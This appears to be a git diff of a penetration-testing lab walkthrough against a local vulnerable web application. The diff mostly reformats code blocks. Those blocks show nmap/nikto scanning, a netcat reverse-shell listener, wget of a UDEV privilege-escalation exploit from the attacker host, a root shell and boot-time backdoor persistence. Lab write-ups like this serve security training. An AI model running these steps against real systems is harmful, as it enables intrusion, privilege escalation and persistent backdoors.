@@ -174,7 +174,7 @@ This step focuses on gathering essential network configuration data from the att
 
     Execute the aggressive detection using the following command:
     ```bash
-    $ sudo nmap -A 10.0.2.4
+      sudo nmap -A 10.0.2.4
     ```
 
     ![HTTP Service](/images/http.png)
@@ -211,7 +211,7 @@ This step focuses on gathering essential network configuration data from the att
    Execute the `nikto` command from the Kali Linux terminal, specifying the target URL:
    
    ```bash
-   $ nikto -h [http://10.0.2.4/dvwa](http://10.0.2.4/dvwa)
+     nikto -h [http://10.0.2.4/dvwa](http://10.0.2.4/dvwa)
    ```
    ![HTTP Service](/images/nikto_scan.png)
 
@@ -359,13 +359,12 @@ The goal is to inject a second, non-ping command (`ls -l`) to prove that the use
 
 
    The first action is to prepare the attacker machine (Kali Linux) to **listen** for the incoming connection from the victim.
-   
       1.  On the **Attacker Machine (Kali Linux)**, open a new terminal window.
       2.  Execute the following command to start the Netcat listener on port `1234`:
       
-         ```bash
+      ```bash
          nc -vv -l -p 1234
-         ```
+      ```
 
 
    | Option | Description |
@@ -550,13 +549,13 @@ Having confirmed that the current shell runs with insufficient privileges (`www-
 5. Using the Command Injection vulnerability (which is still active via the reverse shell), instruct the victim machine to download the exploit using the `wget` utility.
 
    Execute the following commands in the **reverse shell window**:
+
+    ```bash
+        wget [http://10.0.2.15/local/8572.c](http://10.0.2.15/local/8572.c)
+        ls -al 8572.c
+    ```
    
-       ```bash
-           wget [http://10.0.2.15/local/8572.c](http://10.0.2.15/local/8572.c)
-           ls -al 8572.c
-       ```
-   
-      ![Excuuting Hydra Command](/images/install_8572.png)
+   ![Excuuting Hydra Command](/images/install_8572.png)
 
 
 
@@ -665,14 +664,12 @@ The UDEV exploit requires the Process ID (PID) of the **Netlink socket** as an a
 
 14. After executing the SUID shell, the session should now be running with the highest possible privileges.
 
-
-   Execute the following commands in the newly opened shell session:
-
+    Execute the following commands in the newly opened shell session:
+    
     ```bash
          id
          whoami
     ```
-    
    ![Excuuting Hydra Command](/images/verify_exploit_works.png)
 
    * **Final Result:**
@@ -685,11 +682,9 @@ The UDEV exploit requires the Process ID (PID) of the **Netlink socket** as an a
    
    To ensure a persistent and fully functional shell environment with guaranteed root privileges, we will execute a final command using Python.
    
-   
    This command imports the `os` module in Python to explicitly set both the Real and Effective User IDs to `0` (`root`), and then executes a persistent Bash shell (`/bin/bash -p`).
    
    **Goal:** Establish a permanent, stable, and fully privileged Bash session by explicitly setting the UID to 0.
-   
     In the current root-privileged shell session, execute the following Python command:
     
     ```bash
@@ -752,7 +747,7 @@ Display the attributes and content of the script file:
    Configure listener.sh to run at the default system startup runlevels:
    
    ```bash
-          $ sudo update-rc.d listener.sh defaults
+       sudo update-rc.d listener.sh defaults
    ```
    
    ![Excuuting Hydra Command](/images/persistent_bd.png)
@@ -762,7 +757,7 @@ Display the attributes and content of the script file:
 List the services configured to start at boot (Runlevel 3):
 
    ```bash
-          $ ls -x /etc/rc3.d
+           ls -x /etc/rc3.d
    ```
 
    ![Excuuting Hydra Command](/images/startup.png)
